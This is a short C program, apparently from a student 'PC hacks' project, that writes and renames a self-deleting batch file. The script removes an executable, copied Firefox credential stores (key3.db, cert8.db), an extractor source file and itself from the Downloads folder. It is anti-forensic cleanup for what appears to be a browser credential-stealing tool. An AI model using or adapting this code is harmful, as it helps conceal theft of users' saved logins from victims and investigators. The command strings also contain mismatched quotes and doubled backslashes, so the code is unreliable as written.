#include<stdio.h>
#include <windows.h>

int main()
{
   FILE *fp;
    char str[500];
  //  char address[] = " \"C:\\Users\\USER\\Documents\\GitHub\\CS-196-PC-Hacks\\FireExtinguisher\\"; //change this to the customizable address
    char address[] = "%USERPROFILE%\\Downloads\\";
    char del[] = "\r\ndel ";
    strcpy(str, "del ");
    strcat(str, address);
    strcat(str,"FireExtinguisher.exe\"");
    strcat(str, del);
    strcat(str, address);
    strcat(str, "\\key3.db");
    strcat(str, del);
    strcat(str, address);
    strcat(str, "\\cert8.db");
    strcat(str, del);
    strcat(str, address);
    strcat(str, "\\FileExtracter.java");
    strcat(str, del);
    strcat(str, address);
    strcat(str,"text.bat\"");



    fp = fopen( "text.txt" , "ab+" );
    fputs(str, fp);
    fclose(fp);

//change txt to bat
    int ret;
   char oldname[] = "text.txt";
   char newname[] = "text.bat";

   ret = rename(oldname, newname);
   return 0;
}
